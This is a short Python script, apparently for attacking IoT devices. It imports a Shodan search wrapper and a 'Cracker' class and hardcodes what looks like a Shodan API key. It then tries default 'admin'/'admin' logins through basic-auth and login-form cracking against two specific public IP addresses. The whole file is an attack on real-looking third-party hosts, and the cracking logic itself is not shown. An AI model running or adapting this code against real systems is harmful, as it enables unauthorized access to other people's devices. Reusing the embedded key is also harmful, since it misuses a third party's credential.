from shodan_api import Shodanbrowser
import requests
from cracker import Cracker

def main():
    browser = Shodanbrowser("wdIjyg7aUyE0SEzSCgDQnkXtEMKLNhd4")
    #query_text = input()
    #dispos=browser.searchiotdevices(query_text)
    #print(dispos)
    print (requests.get('http://72.8.196.24:80'))
    cr = Cracker('http://72.8.196.24:80')
    cr.basicauthcrack('admin', 'admin')

    cr2=Cracker('http://165.22.178.231:80')
    cr2.formcrack('admin','admin')


main()
